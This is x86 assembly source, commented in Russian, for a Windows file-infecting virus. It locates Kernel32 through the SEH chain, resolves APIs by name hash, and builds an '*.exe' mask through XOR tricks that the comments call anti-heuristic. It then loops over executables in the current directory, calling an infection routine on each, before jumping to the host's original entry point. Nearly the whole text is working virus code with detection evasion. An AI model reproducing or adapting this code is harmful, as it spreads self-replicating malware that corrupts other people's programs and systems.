;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция ValidPE
;Проверка правильности РЕ-файла
;Вход:
;eax - адрес в памяти
;Выход:
;если это РЕ-файл, то ebx!=0, иначе ebx=0.
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
ValidPE:
	mov	dx,631Ah                        		;антиэвристка
	xor	dx,3957h
	mov	bx,0D625h
	xor	bx,9375h                                        ;'ZM'(MZ)
	cmp	word ptr [eax],dx
	jne 	_invalid0_
	mov	edi,dword ptr [eax+3Ch]                         ;переходим к РЕ-заголовку
	cmp	edi,200h
	jg	_invalid0_                                      
	cmp	word ptr [eax+edi],bx                           ;'EP'(PE)
	je	_itispe_
_invalid0_:
	xor	ebx,ebx
_itispe_:
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции ValidPE
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция GetKernelSEH
;Поиск базы Kernel32.dll через SEH
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetKernelSEH:
	xor	edx,edx
	mov	esi,dword ptr fs:[edx]              		;в еах - указатель на структуру ERR
_searchk_:
	lodsd			                    		;последний элемент
	inc	eax                                             ;должен быть равен 0хffffffff
	je	_okhandler_                                     ;
	dec	eax
	xchg	esi,eax
	jmp	_searchk_
_okhandler_:
	lodsd		                            		;если пришли к последнему элементу
								;адрес обработчика
	xor	ax,ax                                           ;гранулярность выделения памяти
	push	06h
	pop	ecx                                             ;счетчик страниц
_next0_:
	call	ValidPE                                         ;проверка очередной страницы
	test	ebx,ebx
	je	_sub0_
	xchg	esi,eax			                        ;в esi - сидит наша база
	ret
_sub0_:
	sub	eax,10000h                      		;с учетом гранулярности
	loop	_next0_
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции GetKernelSEH
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция GetGetProcAddress
;Поиск адреса необходимой функции путем сравнения хэшей
;Вход:
;esi - база модуля(Kernel32.dll, User32.dll, etc)
;edi - дарес таблицы хэшей
;Выход: 
;в стеке нужные адреса апишек
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
GetGetProcAddress:
	assume	esi:ptr IMAGE_DOS_HEADER     			;esi - заголовок MZ
	mov	ebx,esi
	add	esi,[esi].e_lfanew
	;cld
	lodsd
	add	esi,sizeof IMAGE_FILE_HEADER
	assume	esi:ptr IMAGE_OPTIONAL_HEADER            	;esi - опциональный заголовок
	mov	esi,[esi].DataDirectory[0].VirtualAddress
	add	esi,ebx
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY                  ;esi - структура IMAGE_EXPORT_DIRECTORY
	push	esi
	mov	esi,[esi].AddressOfNames
	add	esi,ebx                                         ;esi - массив имен функций
	push	esi
;------------------------------------------------------------------------------
_BeginSearch_:  						;поиск адреса функции путем сравнения хешей:)
	;cdq
	xor	edx,edx                         		;в edx - храним индекс
_next1_:
        push	esi
        mov	esi,dword ptr [esi]
	add	esi,ebx
;------------------------------------------------------------------------------
_CalcHash_:                                           		;считаем хеш от имени
	xor	eax,eax
	xor	ecx,ecx
_calc_:
	ror	eax,7
	xor	ecx,eax
	lodsb
	test	al,al
	jne	_calc_
	cmp	ecx,dword ptr [edi];edi       			
	pop	esi
	je	_okhash_                                        ;если хеши совпали
	inc	edx                                             ;иначе увеличиваем edx
	lodsd
	jmp	_next1_
_okhash_:
	mov	esi,dword ptr [ebp-4*2]
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY
	push	esi
	mov	esi,[esi].AddressOfNameOrdinals                 ;esi - массивслов с индексами
	add	esi,ebx                                         ;массив ординалов(16 бит)
	movzx	edx,word ptr [esi][edx*2]
	pop	esi
	sub	edx,[esi].nBase                                 ;вычитаем начальный ординал
	inc	edx                                             ;так как начальный ординал начинаетсяс 1
	mov	esi,[esi].AddressOfFunctions
	add	esi,ebx                                         ;edi - массив адресов функций
	mov	edx,dword ptr [esi][edx*4]
	add	edx,ebx                                         ;в edx - адрес нужной функции
	push	edx                                             ;кладем адрес в стэк
	add	edi,4
	mov	esi,dword ptr [ebp-4*3]
	cmp	word ptr [edi],0ffffh                           ;все ли адреса найдены?
	jne	_BeginSearch_                                   ;если нет, то ищем дальше
	push	dword ptr [ebp-4*1]                             ;иначе выходим:)!
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции GetGetProcAddress
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	

	
SizeSec	equ 28h
	

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;начало выполнения нашего кода!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
_01_:
	sub	esp,140h					;под WIN32_FIND_DATA
	mov	eax,VirusSize
	push	ebx 						;ebx - address _table_
	call	GetKernelSEH                                    ;вызываем функцию получения базы Kernel32.dll
	call	_delta0_                                        ;вычисляем дельта-смещение
_delta0_:
	sub	dword ptr [esp],offset _delta0_
	mov	ebp,esp                                         ;устанавливаем ebp=esp
	lea	edi,HashTable1
	add	edi,delta
	call	GetGetProcAddress                               ;вызываем функцию получения адресов нужных апишек
;------------------------------------------------------------------------------
;comment @
	lea	eax,start
	add	eax,delta
	lea	ebx,dword ptr [ebp-44h];==[esp-4]
	push	ebx;esp
	push	PAGE_EXECUTE_READWRITE
	push    VirusSize
	push    eax
	call	_fVirtualProtect                                ;делаем атрибы страницы(в которой расположен наш вирковый кож:)! PAGE_EXEUCUTE_READWRITE
	;@
;------------------------------------------------------------------------------
	pushz	"user32.dll"
	call	_fLoadLibraryA                                  ;загружаем User32.dll
	
	pushz	"MessageBoxA"
	push	eax
	call	_fGetProcAddress                                ;получаем адрес апишки "MessageBoxA"
	push	eax                                             ;и сохраняем его в стэке
;------------------------------------------------------------------------------
	lea	edi,[ebp+4*2+2ch];wfd.cFileName
	push	edi
	push	MAX_PATH
	call	_fGetCurrentDirectoryA                          ;получаем текущую директорию

	push	edi
	xor	eax,eax
	scasb
	jne	$-1
	dec	edi
	mov	dword ptr [edi],'cool'                   	;антиэвристка
	mov	dword ptr [edi+4],'fire'                	;в финале образуется маска: "\*.exe"
	xor	dword ptr [edi],06414530h
	xor	dword ptr [edi+4],6669171dh
	pop	edi

;xxxxxxxxxxxxxxxxxxxxBEG Поиск и инфект файлов в текущей директорииxxxxxxxxxxxx
	lea	esi,[ebp+4*2];wfd
	push	esi
	push	edi
	call	_fFindFirstFileA                                ;начало поиска
	inc	eax
	test	eax,eax
	je	_exitfind_	
	dec	eax                                             ;если удачно, 
	push	eax;save hFindFile                              ;то сохраняем полученный хэндл
	                                                        
_findfile_:
	lea	eax,dwOEP
	add	eax,delta
	push	dword ptr [eax] 				;сохраняем OEP(неактульно только для первого поколения - другие ок!)
	call	InfectFiles                                	;вызываем функцию инфекта РЕ-файлов
	pop	dword ptr [eax]                                 ;восстанавливаем OEP
			
	push	esi
	push	dword ptr [ebp-4*18];[esp+4]                    ;hFindFile
	call	_fFindNextFileA                                 ;продолжаем поиск
	test	eax,eax
	jne	_findfile_
;xxxxxxxxxxxxxxxxxxxxEND Поиск и инфект файлов в текущей директорииxxxxxxxxxxxx
	
_exitfind_:
	call	Play                  				;"полезная нагрузка:)!" вызов мессаги
	cmp	delta,0                                         ;смотрим - первое ли поколение?
	je	_firstgen_                                      ;если да, то на выход
;------------------------------------------------------------------------------
	mov	ebx,dwAddrTableLoad                             ;иначе, в ebx - адрес таблички загрузчика
	test	ebx,ebx                                         ;если ebx==0(это означает, что загрузчика нет - то есть  
	je	_final_                                         ;весь код был записан в заголовке жертвы), то тогда передаем 
	                                                        ;управление носителю(жертве:)!
	movzx	ecx,byte ptr [ebx]                              ;иначе, в есх - кол-во записанных кусков нашего зверька
	inc	ebx
_restore_:
	push	ecx
	mov	edi,dword ptr [ebx]                             ;в edi - адрес очередного куска
	movzx	esi,word ptr [ebx+4]                            ;в esi - размер данного куска
	lea	eax,dword ptr [ebp-50h];==[esp-4]
	push	eax
	push	PAGE_EXECUTE_READWRITE
	push    esi
	push    edi
	call	_fVirtualProtect                                ;изменяем атрибуты (чтобы можно было затереть кусок нашего зверька)

	mov	ecx,esi
	xor	eax,eax
	rep	stosb                                           ;и все восстанавливаем (затираем нулями:)!
	add	ebx,6
	pop	ecx
	loop	_restore_
;------------------------------------------------------------------------------
_final_:                                                        ;выравниваем стэк
	lea	esp,[ebp+4*2+140h]

	mov	eax,12345678h
	org	$-4
dwOEP	dd	00400000h

	jmp	eax                                             ;и передаем управление носителю(жертве:)!
;------------------------------------------------------------------------------
_end_:
VirusSize	equ $-start                                     ;размер нашего зверька:)!
;------------------------------------------------------------------------------
_firstgen_:
	push	0
	call	ExitProcess                                   	;выход в ОС
end start
;Будь сильным - слабым всегда не везет!